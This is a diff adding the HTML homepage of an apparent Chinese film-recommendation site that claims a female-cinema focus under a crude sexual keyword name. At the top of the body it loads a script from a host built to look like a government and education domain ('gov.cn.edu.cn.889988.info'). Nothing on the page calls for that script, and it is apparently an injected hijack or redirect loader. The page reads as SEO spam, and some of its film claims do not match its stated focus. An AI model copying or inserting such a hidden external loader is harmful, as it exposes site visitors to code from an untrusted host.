@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="搞处女电影网，聚焦女性导演、女性主角与女性视角的优质电影推荐站。按情绪、年代、类型推荐高分女性电影，附女性影史指南、口碑榜单与正版观看入口建议。">
+<meta name="keywords" content="搞处女电影网,女性电影,女性导演,高分电影推荐,爱情电影,女性影史,观影指南,影视榜单,正版影视">
+<meta name="author" content="搞处女电影网编辑部">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>搞处女电影网 - 她镜头下的好电影 | 女性视角观影指南</title>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --rose:#e0527a; --rose-d:#bd2f61; --plum:#8a4f8c; --cream:#fff7f5;
+  --ink:#3a2b32; --card:#fff; --line:#f3e3e8; --sub:#a08b95;
+  --gold:#e8b04b; --coral:#f2765c; --lilac:#b39ddb; --mint:#7cc9b8;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:var(--cream);color:#6a5b63;line-height:1.8;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.26s}
+ul,ol{list-style:none}
+.container{width:100%;max-width:1180px;margin:0 auto;padding:0 22px}
+::selection{background:var(--rose);color:#fff}
+
+/* ============ 导航（花瓣胶囊） ============ */
+.topbar{position:sticky;top:0;z-index:1000;background:rgba(255,247,245,.96);backdrop-filter:blur(12px);border-bottom:1.5px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:68px;gap:14px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:950}
+.logo .petal{position:relative;width:44px;height:44px;background:radial-gradient(circle at 34% 30%,#ffd6e0,var(--rose) 62%,var(--rose-d));border-radius:50% 50% 50% 10%;transform:rotate(-28deg);box-shadow:0 0 22px rgba(224,82,122,.45)}
+.logo .petal::after{content:"";position:absolute;inset:-9px;border-radius:50%;border:3px solid rgba(224,82,122,.24);animation:pulse 2.5s infinite}
+@keyframes pulse{50%{transform:scale(1.16) rotate(-28deg);opacity:.3}}
+.logo span{font-size:21px;color:var(--ink)}
+.logo span b{color:var(--rose)}
+.search{position:relative;flex:1;max-width:340px}
+.search input{width:100%;padding:11px 46px 11px 20px;border-radius:26px;border:1.5px solid var(--line);background:#fff;font-size:14px;outline:none;color:var(--ink)}
+.search input:focus{border-color:var(--rose);box-shadow:0 0 0 4px rgba(224,82,122,.13)}
+.search button{position:absolute;right:7px;top:7px;width:34px;height:34px;border:none;background:var(--plum);border-radius:50%;color:#fff;cursor:pointer;font-size:13px}
+.burger{display:none;width:44px;height:44px;align-items:center;justify-content:center;cursor:pointer;background:none;border:none;flex-direction:column;gap:5px}
+.burger i{width:23px;height:2px;background:var(--ink);border-radius:2px}
+.links{display:flex;gap:4px}
+.links a{padding:10px 16px;font-size:14px;color:var(--sub);border-radius:18px;font-weight:800}
+.links a:hover{color:var(--rose);background:#fdeef2}
+.links a.on{color:#fff;background:linear-gradient(120deg,var(--rose),var(--plum))}
+
+/* ============ 首屏 ============ */
+.hero{position:relative;padding:56px 0 44px;overflow:hidden;background:
+  radial-gradient(circle at 88% 12%,#ffe3ec 0 18%,transparent 19%),
+  radial-gradient(circle at 8% 88%,#ead9f2 0 16%,transparent 17%),
+  linear-gradient(180deg,#fff0f4,#fff7f5);}
+.bloom{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+.bloom i{position:absolute;border-radius:50% 50% 50% 12%;opacity:.5;animation:float 9s ease-in-out infinite alternate}
+@keyframes float{to{transform:translate3d(20px,-26px,0) rotate(14deg)}}
+.hero-in{position:relative;z-index:2;display:grid;grid-template-columns:1fr 370px;gap:34px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:9px;padding:8px 18px;border-radius:24px;background:#fff;border:1.5px dashed var(--rose);color:var(--rose);font-size:13px;font-weight:800;letter-spacing:1px}
+.hero h1{font-size:clamp(32px,6.4vw,56px);line-height:1.18;font-weight:950;color:var(--ink);margin-top:16px;letter-spacing:-.6px}
+.hero h1 em{font-style:normal;color:var(--rose);position:relative;display:inline-block}
+.hero h1 em::after{content:"✿";position:absolute;right:-26px;top:2px;font-size:.42em;color:var(--gold);animation:spin 7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hero h1 small{display:block;font-size:clamp(12px,1.8vw,14px);color:var(--sub);font-weight:700;margin-top:14px;letter-spacing:5px}
+.hero p{color:var(--sub);font-size:clamp(14px,2vw,16px);margin:18px 0 24px;max-width:560px}
+.h-cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:15px 34px;border-radius:16px;font-size:15px;font-weight:950;cursor:pointer;border:none;letter-spacing:.5px}
+.btn-s{background:linear-gradient(120deg,var(--rose),var(--rose-d));color:#fff;box-shadow:0 14px 28px rgba(189,47,97,.34)}
+.btn-s:hover{transform:translateY(-2px)}
+.btn-o{border:1.5px solid var(--line);background:#fff;color:var(--ink)}
+.btn-o:hover{border-color:var(--rose);color:var(--rose)}
+/* 她の三部 */
+.she{background:#fff;border-radius:26px;padding:24px;box-shadow:0 24px 54px rgba(160,90,120,.16);position:relative;overflow:hidden}
+.she::before{content:"她";position:absolute;right:6px;bottom:-54px;font-size:170px;font-weight:950;color:#fdeaf0;line-height:1;letter-spacing:-8px}
+.she h3{font-size:15px;color:var(--ink);margin-bottom:14px;letter-spacing:.5px;display:flex;align-items:center;gap:8px}
+.she h3 u{text-decoration:none;font-size:20px}
+.she ol{position:relative;z-index:2;counter-reset:s}
+.she li{counter-increment:s;display:grid;grid-template-columns:44px 1fr;gap:10px;padding:9px 0;font-size:13.5px;border-bottom:1px dashed var(--line)}
+.she li:last-child{border:none}
+.she li::before{content:counter(s,decimal-leading-zero);font-family:Georgia,serif;font-weight:900;color:#fff;background:linear-gradient(135deg,var(--rose),var(--plum));width:32px;height:32px;border-radius:50%;display:grid;place-items:center;font-size:12px}
+.she li b{color:var(--ink);font-weight:850;display:block;font-size:14px}
+.she li span{color:var(--sub);font-size:12.5px}
+
+/* ============ 区块头 ============ */
+section{padding:64px 0;position:relative}
+.sec-h{display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap;margin-bottom:28px}
+.sec-h .petal{width:26px;height:26px;border-radius:50% 50% 50% 8%;background:radial-gradient(circle at 34% 30%,#ffd6e0,var(--rose));transform:rotate(-28deg)}
+.sec-h h2{font-size:clamp(21px,3.5vw,30px);font-weight:950;color:var(--ink)}
+.sec-h h2 i{font-style:normal;color:var(--rose)}
+.sec-h .more{margin-left:auto;font-size:13px;color:var(--sub);padding:7px 18px;border-radius:22px;background:#fff;border:1.5px solid var(--line)}
+.sec-h .more:hover{color:var(--rose);border-color:var(--rose)}
+
+/* ============ 栏目一：她主角（横向滑动 + 竖版封面 + 情绪标签） ============ */
+.tape{display:flex;gap:0;overflow-x:auto;padding:4px 2px 20px;scroll-snap-type:x mandatory;scrollbar-width:thin}
+.tape::-webkit-scrollbar{height:9px}
+.tape::-webkit-scrollbar-thumb{background:var(--line);border-radius:5px}
+.frm{flex:0 0 clamp(210px,20vw,250px);scroll-snap-align:start;margin-right:16px}
+.frm .cv{position:relative;aspect-ratio:3/4;border-radius:16px;overflow:hidden;display:grid;place-items:center;font-size:40px}
+.frm .cv::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 50%,rgba(58,43,50,.92));opacity:0;transition:.32s}
+.frm:hover .cv::after{opacity:1}
+.frm .cv .go{position:absolute;z-index:3;width:54px;height:54px;border-radius:50%;background:rgba(255,255,255,.28);border:2px solid #fff;display:grid;place-items:center;font-size:19px;opacity:0;transition:.32s;backdrop-filter:blur(3px)}
+.frm:hover .cv .go{opacity:1;transform:scale(1.07)}
+.frm .cv .mood{position:absolute;top:12px;left:12px;z-index:3;font-size:11px;font-weight:800;padding:5px 11px;border-radius:20px;background:rgba(255,255,255,.86);color:var(--rose-d)}
+.frm .nm{font-size:16px;font-weight:900;color:var(--ink);margin-top:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.frm .mk{font-size:12px;color:var(--sub);display:flex;justify-content:space-between;margin-top:3px}
+.frm .mk b{color:var(--rose);font-family:Georgia,serif;font-size:13px}
+
+/* ============ 栏目二：她镜头（环形花瓣盘 + 图例） ============ */
+.wheel{display:grid;grid-template-columns:420px 1fr;gap:34px;align-items:center}
+.pie{position:relative;width:100%;max-width:400px;aspect-ratio:1;margin:0 auto;border-radius:50%;overflow:hidden;
+  background:conic-gradient(var(--rose) 0 16.6%,var(--gold) 16.6% 33.3%,var(--coral) 33.3% 50%,var(--mint) 50% 66.6%,var(--lilac) 66.6% 83.3%,var(--plum) 83.6% 100%)}
+.pie::after{content:"她镜头";position:absolute;inset:26%;background:#fff;border-radius:50%;display:grid;place-items:center;font-size:22px;font-weight:950;color:var(--ink);box-shadow:0 10px 30px rgba(0,0,0,.12)}
+.pie i{position:absolute;inset:26%;border-radius:50%;border:2px dashed var(--line);animation:spin 20s linear infinite}
+.legend{display:grid;gap:13px}
+.legend .lg{display:flex;align-items:center;gap:14px;background:var(--card);border-radius:15px;padding:14px 18px;border:1.5px solid var(--line)}
+.legend .dot{width:16px;height:16px;border-radius:50% 50% 50% 6%;flex:none}
+.legend b{font-size:16px;color:var(--ink);font-weight:900;min-width:130px}
+.legend span{font-size:12.5px;color:var(--sub)}
+
+/* ============ 栏目三：她影史（竖向时间轴） ============ */
+.tl{position:relative;padding-left:36px}
+.tl::before{content:"";position:absolute;left:11px;top:8px;bottom:8px;width:3px;border-radius:3px;
+  background:linear-gradient(180deg,var(--rose),var(--gold),var(--mint));opacity:.75}
+.node{position:relative;background:var(--card);border-radius:18px;padding:20px 24px;border:1.5px solid var(--line);margin-bottom:16px}
+.node:hover{transform:translateX(6px);box-shadow:0 16px 34px rgba(160,90,120,.18);border-color:#f4c6d4}
+.node::before{content:"";position:absolute;left:-32px;top:26px;width:20px;height:20px;border-radius:50% 50% 50% 5%;background:#fff;border:4px solid var(--rose)}
+.node .yr{font-family:Georgia,serif;font-weight:950;font-size:15px;color:var(--rose);letter-spacing:1px}
+.node h3{font-size:17px;color:var(--ink);font-weight:950;margin:2px 0 7px}
+.node p{font-size:13.5px;color:var(--sub);line-height:1.75}
+
+/* ============ 栏目四：口碑榜 ============ */
+.rank{background:var(--card);border-radius:24px;padding:26px 30px;border:1.5px solid var(--line);box-shadow:0 10px 26px rgba(160,90,120,.1)}
+.rk{display:flex;align-items:center;gap:15px;padding:12px 0;border-bottom:1.5px dashed var(--line)}
+.rk:last-child{border:none}
+.rk .no{font-size:26px;font-weight:950;font-family:Georgia,serif;min-width:50px;color:var(--sub)}
+.rk.top1 .no,.rk.top2 .no{color:var(--rose)}
+.rk.top3 .no{color:var(--plum)}
+.rk .body{flex:1}
+.rk .nm{font-size:16px;font-weight:850;color:var(--ink);display:flex;justify-content:space-between;gap:10px}
+.rk .tp{height:10px;border-radius:6px;background:#f4e6eb;overflow:hidden;margin-top:7px}
+.rk .tp i{display:block;height:100%;border-radius:6px;background:linear-gradient(90deg,#f7b8cc,var(--rose));transform-origin:left;animation:fl 1.05s cubic-bezier(.2,.8,.2,1)}
+@keyframes fl{from{transform:scaleX(0)}to{transform:scaleX(1)}}
+.rk .nm em{font-style:normal;font-size:12px;color:var(--sub);font-weight:600;white-space:nowrap}
+
+/* ============ 栏目五：情绪索引（花瓣标签云 + 字母索引导航） ============ */
+.cloudbox{background:linear-gradient(135deg,#ffe3ec,#f0e3f7);border-radius:24px;padding:28px}
+.cw{display:flex;flex-wrap:wrap;gap:11px}
+.cw a{position:relative;padding:10px 20px;border-radius:14px;background:#fff;border:1.5px solid var(--line);color:var(--ink);font-weight:850;font-size:14px}
+.cw a:hover{transform:translateY(-3px) rotate(-1.5deg);border-color:var(--rose);color:var(--rose);box-shadow:0 9px 20px rgba(224,82,122,.22)}
+.cw a i{font-style:normal;font-size:11px;color:var(--mint);margin-left:6px;font-weight:900}
+.letters{display:flex;gap:7px;flex-wrap:wrap;margin-top:20px;padding-top:18px;border-top:1.5px dashed rgba(200,120,150,.4)}
+.letters a{width:32px;height:32px;border-radius:10px;display:grid;place-items:center;font-size:13px;font-weight:900;background:#fff;border:1.5px solid var(--line);color:var(--sub)}
+.letters a:hover{background:var(--rose);color:#fff;border-color:var(--rose)}
+
+/* ============ 订阅 ============ */
+.join{background:linear-gradient(120deg,var(--plum),var(--rose-d));border-radius:28px;padding:42px;color:#fff;display:grid;grid-template-columns:1fr 430px;gap:26px;align-items:center;position:relative;overflow:hidden}
+.join::after{content:"✿";position:absolute;right:22px;top:-30px;font-size:230px;color:rgba(255,255,255,.1);line-height:1}
+.join h3{font-size:25px;margin-bottom:11px}
+.join h3 i{font-style:normal;color:#ffd6e0}
+.join p{color:rgba(255,255,255,.88);font-size:15px;max-width:600px}
+.join form{display:flex;gap:10px;flex-wrap:wrap;position:relative;z-index:2}
+.join input{flex:1;min-width:230px;padding:15px 22px;border-radius:14px;border:none;font-size:15px;outline:none}
+.join button{padding:15px 36px;border-radius:14px;border:none;background:var(--gold);color:#fff;font-weight:950;cursor:pointer;letter-spacing:.6px}
+.join button:hover{transform:translateY(-2px);background:#f7c56a}
+
+/* ============ 页脚 ============ */
+footer{background:#3a2b32;color:#e2d4da;padding:54px 0 24px;margin-top:14px}
+.fgrid{display:grid;grid-template-columns:1.9fr 1fr 1fr 1fr;gap:30px;margin-bottom:28px}
+.ft .logo{color:#fff;margin-bottom:14px}
+.ft p{font-size:14px;max-width:390px;line-height:1.85;color:#c3b5bd}
+.fcol h4{color:#fff;font-size:15px;margin-bottom:15px;position:relative;display:inline-block}
+.fcol h4::after{content:"";position:absolute;left:0;bottom:-5px;width:20px;height:3px;background:var(--rose);border-radius:2px}
+.fcol a{display:block;font-size:14px;padding:6px 0;color:#c3b5bd}
+.fcol a:hover{color:#ffd6e0;padding-left:6px}
+.copy{text-align:center;padding-top:24px;border-top:1px solid rgba(255,255,255,.1);font-size:13px;color:#a8919a}
+.copy a{color:#ffd6e0}
+
+/* ============ 动效 ============ */
+.rv{opacity:0;transform:translateY(26px);transition:.68s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none;animation:none!important}}
+
+/* ============ 响应式 ============ */
+@media(max-width:960px){
+  .burger{display:flex}
+  .links{position:fixed;inset:68px 0 0 0;flex-direction:column;background:rgba(255,247,245,.99);padding:22px 20px;gap:4px;transform:translateX(100%);transition:.34s;z-index:999}
+  .links.open{transform:none}
+  .links a{font-size:17px;padding:16px 18px}
+  .search{display:none}
+  .hero-in{grid-template-columns:1fr;gap:26px}
+  .wheel{grid-template-columns:1fr;gap:26px}
+  .join{grid-template-columns:1fr;padding:32px 26px}
+  section{padding:48px 0}
+  .frm{flex:0 0 196px}
+}
+@media(max-width:560px){
+  .logo span{font-size:17px}
+  .pie{max-width:268px}
+  .rk .nm{flex-direction:column;gap:2px}
+  .container{padding:0 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="topbar">
+  <div class="container nav">
+    <a class="logo" href="#" aria-label="搞处女电影网首页">
+      <span class="petal" aria-hidden="true"></span>
+      <span><b>搞处女</b>电影网</span>
+    </a>
+    <div class="search"><input type="search" placeholder="搜片 / 女导演 / 情绪，如：是枝裕和、治愈、成长" aria-label="搜索"><button aria-label="搜索">▶</button></div>
+    <nav class="links" id="links">
+      <a href="#top" class="on">首页</a>
+      <a href="#her">她主角</a>
+      <a href="#lens">她镜头</a>
+      <a href="#time">她影史</a>
+      <a href="#hot">口碑榜</a>
+      <a href="#mood">情绪索引</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<!-- ==================== 首屏 ==================== -->
+<section class="hero" id="top">
+  <div class="bloom" aria-hidden="true">
+    <i style="left:8%;top:12%;width:120px;height:120px;background:#ffd6e0"></i>
+    <i style="right:6%;top:30%;width:86px;height:86px;background:#ead9f2"></i>
+    <i style="left:20%;bottom:8%;width:70px;height:70px;background:#ffe6c8"></i>
+    <i style="right:22%;bottom:14%;width:100px;height:100px;background:#d6ecf7"></i>
+  </div>
+  <div class="container hero-in">
+    <div class="rv">
+      <span class="kicker">✿ 搞处女电影网 · 女性视角的观影指南</span>
+      <h1>她镜头下，<br>藏着<em>好电影</em><small>HER  CINEMA</small></h1>
+      <p>搞处女电影网，聚焦女性导演、女性主角与女性情感的优质电影推荐站。不靠颜值做噱头，只按"她是谁、她经历了什么、她如何抉择"来选片——因为你值得被银幕上的另一种目光看见。</p>
+      <div class="h-cta"><a class="btn btn-s" href="#lens">按情绪选片</a><a class="btn btn-o" href="#time">读懂她影史</a></div>
+    </div>
+    <aside class="she rv">
+      <h3><u>✿</u>她の三部 · 今晚先看哪一部</h3>
+      <ol>
+        <li><b>小偷家族</b><span>是枝裕和 · 没有血缘的一家人</span></li>
+        <li><b>末路狂花</b><span>雷德利·斯科特 · 女性友谊的史诗</span></li>
+        <li><b>傲慢与偏见</b><span>乔·怀特 · 独立女性的爱情课</span></li>
+      </ol>
+    </aside>
+  </div>
+</section>
+
+<!-- ==================== 栏目一：她主角（横向滑动竖版封面） ==================== -->
+<section id="her">
+  <div class="container">
+    <div class="sec-h rev"><span class="petal" aria-hidden="true"></span><h2>她<em>主角</em> · 银幕上值得记住的脸</h2><a class="more" href="#">换一批</a></div>
+    <div class="tape">
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#d97a9c,#9b3f68)">🌸<span class="mood">成长</span><span class="go">▶</span></div><div class="nm">小偷家族</div><div class="mk"><span>家庭 / 是枝裕和</span><b>9.2</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#e8a87c,#b56a3a)">🏜️<span class="mood">自由</span><span class="go">▶</span></div><div class="nm">末路狂花</div><div class="mk"><span>公路 / 女性友谊</span><b>9.0</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#a88fd4,#6a4aa8)">💍<span class="mood">爱情</span><span class="go">▶</span></div><div class="nm">傲慢与偏见</div><div class="mk"><span>爱情 / 经典文学</span><b>8.7</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#7cc9b8,#3f9b8c)">🍃<span class="mood">治愈</span><span class="go">▶</span></div><div class="nm">小森林</div><div class="mk"><span>治愈 / 四季</span><b>8.8</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#f2a6b6,#c96a84)">👑<span class="mood">成长</span><span class="go">▶</span></div><div class="nm">千与千寻</div><div class="mk"><span>动画 / 成长</span><b>9.1</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#e0c08a,#a9844a)">🎤<span class="mood">逐梦</span><span class="go">▶</span></div><div class="nm">波西米亚狂想曲</div><div class="mk"><span>音乐 / 传记</span><b>8.7</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#c58fd0,#8a4f8c)">🔥<span class="mood">觉醒</span><span class="go">▶</span></div><div class="nm">燃烧女子的肖像</div><div class="mk"><span>爱情 / 18世纪</span><b>8.9</b></div></article>
+      <article class="frm rev"><div class="cv" style="background:linear-gradient(160deg,#b98fd6,#7a5ab8)">📖<span class="mood">自我</span><span class="go">▶</span></div><div class="nm">成为简·奥斯汀</div><div class="mk"><span>传记 / 文学</span><b>8.4</b></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目二：她镜头（环形花瓣盘 + 图例） ==================== -->
+<section id="lens" style="background:linear-gradient(180deg,#ffeaf1,transparent)">
+  <div class="container">
+    <div class="sec-h rev"><span class="petal" aria-hidden="true"></span><h2>她<em>镜头</em> · 按情绪，而不是按类型选片</h2><a class="more" href="#">完整情绪表</a></div>
+    <div class="wheel">
+      <div class="pie rev" aria-hidden="true"><i></i></div>
+      <div class="legend rev">
+        <div class="lg"><span class="dot" style="background:var(--rose)"></span><b>想被治愈</b><span>《小森林》《海街日记》——慢下来，吃饭、走路、看云</span></div>
+        <div class="lg"><span class="dot" style="background:var(--gold)"></span><b>想谈恋爱</b><span>《傲慢与偏见》《爱在》三部——台词比情节更动人</span></div>
+        <div class="lg"><span class="dot" style="background:var(--coral)"></span><b>想被点燃</b><span>《末路狂花》《隐藏人物》——关于勇气与出走</span></div>
+        <div class="lg"><span class="dot" style="background:var(--mint)"></span><b>想安静哭</b><span>《小偷家族》《步履不停》——是枝裕和的留白</span></div>
+        <div class="lg"><span class="dot" style="background:var(--lilac)"></span><b>想烧脑</b><span>《消失的爱人》《利刃出鞘》——她不只是受害者</span></div>
+        <div class="lg"><span class="dot" style="background:var(--plum)"></span><b>想被美到</b><span>《布达佩斯大饭店》《坠入》——每一帧都能当壁纸</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目三：她影史（竖向时间轴） ==================== -->
+<section id="time">
+  <div class="container">
+    <div class="sec-h rev"><span class="petal" aria-hidden="true"></span><h2>她<em>影史</em> · 女性电影的三个转身</h2><a class="more" href="#">完整影史</a></div>
+    <div class="tl">
+      <div class="node rev"><div class="yr">1896 — 1929</div><h3>她第一次出现在镜头前</h3><p>从梅里爱的魔术短片到默片时代的女演员，女性先是"被观看的对象"。爱丽丝·盖伊-布拉切作为史上首位女性导演，1906 年便拍出了叙事电影——比多数电影史教科书愿意承认的要早得多。</p></div>
+      <div class="node rev"><div class="yr">1970s — 1990s</div><h3>她开始握住摄影机</h3><p>新好莱坞与欧洲作者电影并行，阿涅斯·瓦尔达、莎莉·波特、简·坎皮恩让"女性经验"第一次成为叙事主体而非背景。1991 年《末路狂花》把女性友谊拍成了公路史诗，至今仍是女性电影的分水岭。</p></div>
+      <div class="node rev"><div class="yr">2000 — 2015</div><h3>她从边缘走向中心</h3><p>是枝裕和、索菲亚·科波拉、凯瑟琳·毕格罗、朴赞郁笔下的女性复杂、矛盾、不可被概括。毕格罗成为首位奥斯卡最佳导演女性（2010《拆弹部队》），女性不再只是"被讲述"。</p></div>
+      <div class="node rev"><div class="yr">2016 — 至今</div><h3>她定义自己的故事</h3><p>《三块广告牌》《燃烧女子的肖像》《坠落》《可怜的东西》——女性导演与女性主角同时站在聚光灯下。2024 年，更多女性名字出现在最佳导演与最佳影片的提名名单里。故事，终于开始由她自己讲述。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目四：口碑榜 ==================== -->
+<section id="hot" style="background:linear-gradient(180deg,transparent,#ffeaf1)">
+  <div class="container">
+    <div class="sec-h rev"><span class="petal" aria-hidden="true"></span><h2>口碑<em>榜</em> · 搞处女电影网编辑部推荐 TOP 8</h2><a class="more" href="#">周榜 / 月榜 / 年代榜</a></div>
+    <div class="rank rev">
+      <div class="rk top1"><span class="no">01</span><div class="body"><div class="nm"><span>小偷家族</span><em>2018 · 是枝裕和</em></div><div class="tp"><i style="width:99%"></i></div></div></div>
+      <div class="rk top2"><span class="no">02</span><div class="body"><div class="nm"><span>千与千寻</span><em>2001 · 宫崎骏</em></div><div class="tp"><i style="width:96%"></i></div></div></div>
+      <div class="rk top3"><span class="no">03</span><div class="body"><div class="nm"><span>末路狂花</span><em>1991 · 雷德利·斯科特</em></div><div class="tp"><i style="width:93%"></i></div></div></div>
+      <div class="rk"><span class="no">04</span><div class="body"><div class="nm"><span>燃烧女子的肖像</span><em>2019 · 瑟琳·席安玛</em></div><div class="tp"><i style="width:89%"></i></div></div></div>
+      <div class="rk"><span class="no">05</span><div class="body"><div class="nm"><span>傲慢与偏见</span><em>2005 · 乔·怀特</em></div><div class="tp"><i style="width:85%"></i></div></div></div>
+      <div class="rk"><span class="no">06</span><div class="body"><div class="nm"><span>海街日记</span><em>2015 · 是枝裕和</em></div><div class="tp"><i style="width:82%"></i></div></div></div>
+      <div class="rk"><span class="no">07</span><div class="body"><div class="nm"><span>小森林</span><em>2014 · 森淳一</em></div><div class="tp"><i style="width:78%"></i></div></div></div>
+      <div class="rk"><span class="no">08</span><div class="body"><div class="nm"><span>隐藏人物</span><em>2016 · 西奥多·梅尔菲</em></div><div class="tp"><i style="width:74%"></i></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目五：情绪索引（花瓣标签云 + 字母索引导航） ==================== -->
+<section id="mood">
+  <div class="container">
+    <div class="sec-h rev"><span class="petal" aria-hidden="true"></span><h2>情绪<em>索引</em> · 按心情，而不是按类型</h2><a class="more" href="#">按年代 / 按地区</a></div>
+    <div class="cloudbox rev">
+      <div class="cw">
+        <a href="#">想被治愈 <i>118</i></a>
+        <a href="#">想谈恋爱 <i>96</i></a>
+        <a href="#">想被点燃 <i>74</i></a>
+        <a href="#">想安静哭 <i>88</i></a>
+        <a href="#">想烧脑 <i>63</i></a>
+        <a href="#">想被美到 <i>57</i></a>
+        <a href="#">想大笑 <i>69</i></a>
+        <a href="#">想逃离 <i>48</i></a>
+        <a href="#">想长大 <i>52</i></a>
+        <a href="#">想回家 <i>44</i></a>
+        <a href="#">想勇敢 <i>39</i></a>
+        <a href="#">想独处 <i>31</i></a>
+        <a href="#">想懂母亲 <i>26</i></a>
+        <a href="#">想见旧友 <i>23</i></a>
+        <a href="#">想原谅 <i>29</i></a>
+        <a href="#">想重新开始 <i>34</i></a>
+      </div>
+      <div class="letters">
+        <a href="#">全</a><a href="#">A</a><a href="#">B</a><a href="#">C</a><a href="#">D</a><a href="#">E</a><a href="#">F</a><a href="#">G</a><a href="#">H</a>
+        <a href="#">J</a><a href="#">K</a><a href="#">L</a><a href="#">M</a><a href="#">N</a><a href="#">P</a><a href="#">Q</a><a href="#">R</a><a href="#">S</a>
+        <a href="#">T</a><a href="#">W</a><a href="#">X</a><a href="#">Y</a><a href="#">Z</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 订阅 ==================== -->
+<section id="joinS">
+  <div class="container">
+    <div class="join rev">
+      <div>
+        <h3>✿ 订阅 <i>她的片单</i></h3>
+        <p>每周五傍晚，5 部本周最值得看的"她电影" + 1 篇女性影史小知识，直送邮箱。不群发、不推销、可一键退订。让"今晚看什么"，从此有答案。</p>
+      </div>
+      <form id="sub" novalidate>
+        <input type="email" id="mail" placeholder="留下邮箱，与她相遇" aria-label="邮箱" required>
+        <button type="submit">立刻订阅</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 页脚 ==================== -->
+<footer>
+  <div class="container">
+    <div class="fgrid">
+      <div class="ft">
+        <a class="logo" href="#"><span class="petal" aria-hidden="true"></span><span style="color:#fff"><b style="color:#ffd6e0">搞处女</b>电影网</span></a>
+        <p>搞处女电影网是一个聚焦女性导演、女性主角与女性情感的优质电影推荐与观影指引站。我们按情绪、年代、类型、地区帮你找到值得看的那一部。本站只做收录与原创解读，不提供任何影视资源下载与盗链，倡导通过正版渠道观看。</p>
+      </div>
+      <div class="fcol"><h4>快速入口</h4><a href="#her">她主角</a><a href="#lens">她镜头</a><a href="#time">她影史</a><a href="#hot">口碑榜</a><a href="#mood">情绪索引</a></div>
+      <div class="fcol"><h4>分类导航</h4><a href="#">女性导演</a><a href="#">女性成长</a><a href="#">爱情文艺</a><a href="#">治愈系</a><a href="#">女性传记</a></div>
+      <div class="fcol"><h4>关于</h4><a href="#">选片标准</a><a href="#">编辑团队</a><a href="#">女性影史</a><a href="#">版权声明</a><a href="#">广告合作</a></div>
+    </div>
+    <div class="copy">© 2026 搞处女电影网 版权所有 · 网址：<a href="https://gaochunudianyingwang-cn.github.io/">https://gaochunudianyingwang-cn.github.io/</a> · 影片请通过影院与正规视频平台观看</div>
+  </div>
+</footer>
+
+<script>
+var bg=document.getElementById('burger'),ls=document.getElementById('links');
+bg.addEventListener('click',function(){ls.classList.toggle('open');bg.setAttribute('aria-expanded',ls.classList.contains('open'));});
+ls.addEventListener('click',function(e){if(e.target.tagName==='A'){ls.classList.remove('open');bg.setAttribute('aria-expanded','false');}});
+
+// 滚动高亮
+var secs=['top','her','lens','time','hot','mood'].map(function(id){return document.getElementById(id);});
+var as=document.querySelectorAll('.links a');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='';
+  secs.forEach(function(s){if(s&&s.offsetTop<=y)cur=s.id;});
+  as.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+},{passive:true});
+
+// 进入视口
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e,i){if(e.isIntersecting){setTimeout(function(){e.target.classList.add('in');},i*60);io.unobserve(e.target);}});
+},{threshold:.1});
+document.querySelectorAll('.rev').forEach(function(el){io.observe(el);});
+
+// 订阅
+document.getElementById('sub').addEventListener('submit',function(e){
+  e.preventDefault();
+  var v=document.getElementById('mail').value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){alert('邮箱格式不对，花瓣送不到哦 ✿');return;}
+  alert('订阅成功！本周五傍晚，她的片单见 🎬');
+  document.getElementById('mail').value='';
+});
+</script>
+</body>
+</html>
